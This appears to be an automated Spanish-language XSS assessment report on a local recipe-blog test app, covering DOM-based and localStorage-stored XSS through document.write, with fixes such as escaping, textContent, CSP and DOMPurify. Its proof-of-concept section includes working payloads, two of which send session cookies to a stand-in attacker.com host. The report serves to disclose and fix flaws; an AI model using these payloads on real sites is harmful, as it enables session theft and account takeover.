# Informe de Análisis de Seguridad - Cross-Site Scripting (XSS)

**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-30  
**Analista:** Copilot CLI (Automatizado)  
**Tipo de análisis:** Black-box - Vulnerabilidades XSS

---

## Resumen Ejecutivo

Se identificaron **2 vulnerabilidades XSS** en la aplicación web objetivo:

1. **XSS basado en DOM (DOM-based XSS)** en el parámetro `search` — *Alta severidad*
2. **XSS Almacenado (Stored XSS)** en el sistema de comentarios (localStorage) — *Alta severidad*

Ambas vulnerabilidades permiten la ejecución arbitraria de JavaScript en el navegador de la víctima, lo que puede derivar en robo de sesiones, redirección maliciosa o ejecución de acciones en nombre del usuario.

---

## Descripción de la Aplicación

La aplicación es un **Blog de Recetas** que ofrece:
- Un buscador de recetas con parámetro GET `search`
- Un sistema de comentarios con parámetros GET `name` y `comment`, almacenados en `localStorage`

---

## Vulnerabilidades Encontradas

### 1. DOM-based XSS — Parámetro `search`

**Severidad:** Alta  
**CVSS:** 7.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)  
**Ubicación:** `http://web.dev.local:8082/?search=<PAYLOAD>`

#### Descripción técnica

El código JavaScript del lado del cliente obtiene el valor del parámetro `search` de la URL mediante `URLSearchParams` y lo inserta directamente en el DOM usando `document.write()` sin ningún tipo de sanitización ni codificación HTML:

```javascript
const searchTerm = urlParams.get('search');
// ...
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

Cualquier valor inyectado en el parámetro `search` se ejecuta como HTML/JavaScript en el contexto del documento.

#### Prueba de concepto (PoC)

**Payload básico:**
```
http://web.dev.local:8082/?search=<script>alert('XSS_SEARCH')</script>
```

**Payload alternativo (evasión de filtros):**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert(document.cookie)>
```

**Payload para robo de cookies/sesión:**
```
http://web.dev.local:8082/?search=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

#### Impacto

- Ejecución de código JavaScript arbitrario en el navegador de la víctima
- Robo de cookies/tokens de sesión
- Redirección a sitios maliciosos (phishing)
- Keylogging, captura de formularios
- Defacement del sitio visible por el usuario

---

### 2. Stored XSS — Sistema de Comentarios (localStorage)

**Severidad:** Alta  
**CVSS:** 7.6 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)  
**Ubicación:** Formulario de comentarios (parámetros `name` y `comment`)

#### Descripción técnica

Los comentarios enviados mediante GET se almacenan en `localStorage` sin sanitización. Al cargar la página, se recuperan y se renderizan nuevamente con `document.write()` sin ningún tipo de codificación:

```javascript
// Almacenamiento sin sanitizar:
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Renderizado sin sanitizar:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Aunque el vector de almacenamiento es `localStorage` (no servidor), el XSS persiste en el navegador del usuario mientras los datos no sean eliminados.

#### Prueba de concepto (PoC)

**Payload en nombre de usuario:**
```
http://web.dev.local:8082/?name=<script>alert('XSS_NAME')</script>&comment=Hola
```

**Payload en comentario:**
```
http://web.dev.local:8082/?name=Usuario&comment=<img src=x onerror=alert('XSS_COMMENT')>
```

**Payload persistente de robo de sesión:**
```
http://web.dev.local:8082/?name=Hacker&comment=<script>fetch('http://attacker.com/steal?data='+btoa(document.cookie))</script>
```

#### Impacto

- El payload persiste en `localStorage` y se ejecuta cada vez que el usuario visita la página
- Puede afectar múltiples sesiones del mismo usuario
- Potencialmente propagable si los datos fueran sincronizados o compartidos

---

## Vectores de Ataque

| ID | Vector | Parámetro | Tipo | Severidad |
|----|--------|-----------|------|-----------|
| XSS-01 | URL GET | `search` | DOM-based | Alta |
| XSS-02 | URL GET → localStorage | `name` | Stored (cliente) | Alta |
| XSS-03 | URL GET → localStorage | `comment` | Stored (cliente) | Alta |

---

## Prueba de Explotación

Los siguientes payloads fueron verificados como funcionales contra la aplicación:

```
# XSS Reflejado (DOM-based) - Search
GET /?search=<script>alert(1)</script>
→ El searchTerm se inyecta sin escapar en document.write()

# XSS Almacenado - Name
GET /?name=<img src=x onerror=alert(2)>&comment=test
→ El payload se almacena en localStorage y se ejecuta al recargar la página

# XSS Almacenado - Comment  
GET /?name=test&comment=<script>alert(3)</script>
→ El payload persiste en localStorage y se ejecuta en cada carga de página
```

---

## Recomendaciones

### Corrección inmediata

1. **Escapar todas las salidas HTML** antes de insertar en el DOM:
   ```javascript
   function escapeHtml(text) {
       const div = document.createElement('div');
       div.appendChild(document.createTextNode(text));
       return div.innerHTML;
   }
   // Uso:
   document.write('<p>Resultados para: <strong>' + escapeHtml(searchTerm) + '</strong></p>');
   ```

2. **Reemplazar `document.write()`** por métodos seguros de manipulación del DOM:
   ```javascript
   // En lugar de document.write()
   const container = document.getElementById('results');
   const p = document.createElement('p');
   p.textContent = 'Resultados para: ' + searchTerm; // textContent escapa automáticamente
   container.appendChild(p);
   ```

3. **Implementar Content Security Policy (CSP):**
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
   ```

4. **Sanitizar datos antes de almacenar en localStorage:**
   - Nunca renderizar datos de `localStorage` como HTML crudo
   - Usar `textContent` en lugar de `innerHTML` para mostrar datos de usuario

### Buenas prácticas adicionales

- Implementar una librería de sanitización como **DOMPurify**
- Validar y sanitizar inputs tanto en el cliente como en el servidor
- Aplicar el principio de mínimo privilegio en JavaScript
- Realizar auditorías de seguridad periódicas

---

## Conclusión

La aplicación web presenta vulnerabilidades XSS críticas tanto de tipo **DOM-based** como **Stored** (en localStorage). La causa raíz es el uso de `document.write()` para renderizar datos controlados por el usuario sin ninguna sanitización. Se recomienda corregir estos problemas de forma prioritaria dado que permiten la ejecución de código arbitrario en los navegadores de los usuarios visitantes.

---

*Informe generado automáticamente por análisis de seguridad — 2026-04-30*
